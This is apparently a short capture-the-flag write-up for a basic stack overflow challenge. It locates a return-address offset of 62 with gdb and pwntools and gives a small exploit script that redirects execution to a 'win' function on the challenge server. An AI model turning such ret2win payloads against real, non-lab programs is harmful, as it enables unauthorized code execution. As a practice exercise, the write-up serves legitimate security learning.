# Pwn Stack Basic

## Description

A win return question

## Analysis

The vulnable function is vuln, because the gets is dangerous. It will cause buf overflow and overwrite things.

The code also show our target is win function.

The approach will be overwrite the return to make the vuln return to win function.

![image](https://github.com/ZHallen122/CTF-Practice-WriteUp/assets/106571949/2178ca9f-406c-4474-8ebd-5fcf55a33ced)

## Solution

Lets use gdb, and first check the position of the win
![image](https://github.com/ZHallen122/CTF-Practice-WriteUp/assets/106571949/f2fb9eaa-6ad1-49fb-8296-ebb391f47a73)

Then run it '(gdb) run'

Need to use pwntool cyclic to generate unic string, because we will check what we overwrite and those unique string will help identify

```
import pwn

pattern = pwn.cyclic(100)  # creates a unique pattern of 100 characters
print(pattern)
```
it will generate this b'aaaabaaacaaadaaaeaaafaaagaa....'

And input it. It will crush the program because we successful overwrite something
![image](https://github.com/ZHallen122/CTF-Practice-WriteUp/assets/106571949/137a0b94-886e-4957-b4a1-aff52c257998)

Now lets check registers, and use the value in eip

![image](https://github.com/ZHallen122/CTF-Practice-WriteUp/assets/106571949/bb4b6be3-3ab4-42df-8d90-11ab3b8ffd5b)

Use the pwntool cyclic_find to know the distance of overwrite return
```
import pwn

offset = pwn.cyclic_find(0x61716161) # use the eip value 
print(offset)

```
The result will be 62, Lets build our payload
```
import pwn

io = pwn.remote(challenge address)

io.sendline()

payload = b"A"*62 + pwn.p32(0x08048526)

io.sendline(payload)
io.interactive()
```

The Flag ！
![image](https://github.com/ZHallen122/CTF-Practice-WriteUp/assets/106571949/e89ebb9b-9896-4ebe-a074-d0dd264468d3)


Can also use ghidra
![image](https://github.com/ZHallen122/CTF-Practice-WriteUp/assets/106571949/e846c80a-c79e-4d2c-845f-81f1f779130c)

## Conclusion
